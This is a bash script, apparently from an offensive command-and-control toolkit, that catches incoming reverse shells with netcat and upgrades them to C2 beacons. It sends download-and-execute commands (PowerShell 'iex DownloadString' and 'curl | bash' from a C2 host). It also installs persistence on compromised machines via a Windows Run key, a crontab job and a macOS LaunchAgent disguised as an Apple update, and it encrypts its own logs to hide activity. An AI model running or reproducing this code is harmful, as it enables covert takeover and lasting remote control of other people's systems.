#!/bin/bash
# Automated shell handler for catching and upgrading reverse shells

# Configuration 
LISTEN_PORT=4444
C2_HOST="127.0.0.1"  # This will be replaced by Ansible with actual C2 IP
C2_PORT=50051        # Sliver default gRPC port
WINDOWS_BEACON="/root/Tools/beacons/windows.exe"
LINUX_BEACON="/root/Tools/beacons/linux"
MACOS_BEACON="/root/Tools/beacons/macos"

# Set secure permissions
umask 077

# Logging function (minimal and encrypted)
log() {
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    local message="$1"
    echo "$timestamp - $message" | openssl enc -e -aes-256-cbc -pbkdf2 -pass pass:$RANDOM$RANDOM$RANDOM >> /root/Tools/shell-handler/activity.log.enc
}

# Detect OS function
detect_os() {
    local connection=$1
    
    # Send commands to determine OS
    echo "echo \$OSTYPE" > $connection
    sleep 1
    ostype=$(cat $connection | grep -i "linux\|darwin\|win")
    
    if [[ $ostype == *"win"* ]]; then
        echo "windows"
    elif [[ $ostype == *"darwin"* ]]; then
        echo "macos"
    elif [[ $ostype == *"linux"* ]]; then
        echo "linux"
    else
        # Try Windows-specific command
        echo "ver" > $connection
        sleep 1
        winver=$(cat $connection | grep -i "microsoft windows")
        
        if [[ -n "$winver" ]]; then
            echo "windows"
        else
            # Default to Linux if we can't determine
            echo "linux"
        fi
    fi
}

# Deploy appropriate beacon based on OS
deploy_beacon() {
    local connection=$1
    local os_type=$2
    
    log "Deploying beacon for detected OS: $os_type"
    
    case $os_type in
        windows)
            # Upload Windows beacon using PowerShell download cradle
            echo "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('http://$C2_HOST:8443/beacon.ps1')" > $connection
            ;;
        linux)
            # Upload Linux beacon using curl
            echo "curl -s http://$C2_HOST:8443/beacon.sh | bash" > $connection
            ;;
        macos)
            # Upload macOS beacon using curl
            echo "curl -s http://$C2_HOST:8443/beacon.sh | bash" > $connection
            ;;
    esac
    
    log "Beacon deployment command sent"
}

# Establish persistence based on OS
establish_persistence() {
    local connection=$1
    local os_type=$2
    
    log "Attempting to establish persistence on $os_type"
    
    case $os_type in
        windows)
            # Windows persistence via registry run key
            echo "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d %TEMP%\\update.exe /f" > $connection
            ;;
        linux)
            # Linux persistence via crontab
            echo "(crontab -l 2>/dev/null; echo '*/15 * * * * curl -s http://$C2_HOST:8443/check.sh | bash') | crontab -" > $connection
            ;;
        macos)
            # macOS persistence via launch agent
            echo "mkdir -p ~/Library/LaunchAgents" > $connection
            echo "echo '<plist version=\"1.0\"><dict><key>Label</key><string>com.apple.software.update</string><key>ProgramArguments</key><array><string>bash</string><string>-c</string><string>curl -s http://$C2_HOST:8443/check.sh | bash</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>900</integer></dict></plist>' > ~/Library/LaunchAgents/com.apple.software.update.plist" > $connection
            echo "launchctl load ~/Library/LaunchAgents/com.apple.software.update.plist" > $connection
            ;;
    esac
    
    log "Persistence commands sent for $os_type"
}

# Main shell handler loop
handle_connections() {
    log "Shell handler started on port $LISTEN_PORT"
    
    # Use mkfifo for bidirectional communication
    PIPE_PATH="/tmp/shell_handler_pipe"
    trap 'rm -f $PIPE_PATH' EXIT
    
    while true; do
        # Clean up existing pipe
        rm -f $PIPE_PATH
        mkfifo $PIPE_PATH
        
        log "Waiting for incoming connection..."
        nc -lvnp $LISTEN_PORT < $PIPE_PATH | tee $PIPE_PATH.output &
        NC_PID=$!
        
        # Wait for connection to be established
        while ! grep -q . $PIPE_PATH.output 2>/dev/null; do
            sleep 1
            # Check if nc is still running
            if ! kill -0 $NC_PID 2>/dev/null; then
                log "Netcat process died, restarting..."
                rm -f $PIPE_PATH $PIPE_PATH.output
                continue 2  # Restart the outer loop
            fi
        done
        
        log "Connection received, detecting OS..."
        DETECTED_OS=$(detect_os "$PIPE_PATH.output")
        log "Detected OS: $DETECTED_OS"
        
        # Deploy beacon
        deploy_beacon "$PIPE_PATH" "$DETECTED_OS"
        sleep 5
        
        # Establish persistence
        establish_persistence "$PIPE_PATH" "$DETECTED_OS"
        sleep 5
        
        # Keep connection alive for manual operation if needed
        log "Beacon deployed, maintaining shell connection..."
        echo "echo 'Shell upgraded to beacon. This connection will remain active for manual operation.'" > $PIPE_PATH
        
        # Wait for connection to close
        wait $NC_PID
        log "Connection closed, cleaning up and restarting listener..."
        rm -f $PIPE_PATH.output
    done
}

# Start the shell handler
handle_connections